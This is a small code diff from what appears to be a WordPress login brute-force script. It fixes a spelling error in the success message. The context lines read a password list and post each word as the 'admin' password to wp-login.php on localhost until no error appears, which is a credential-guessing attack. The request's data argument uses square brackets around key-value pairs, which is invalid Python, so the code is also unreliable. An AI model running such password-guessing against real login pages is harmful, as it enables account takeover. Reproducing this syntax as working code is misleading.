@@ -40,7 +40,7 @@ with open(passfile, "r") as f:
         word = word.strip("\n")
         trying_ = requests.post("http://localhost/wp-login.php", data=["log":"admin", "pwd":word])
         if "ERROR" not in trying_.text:
-            print("Sucess, the password is: "+word)
+            print("Success, the password is: "+word)
             break
         else:
             print("Incorrect password: "+word)
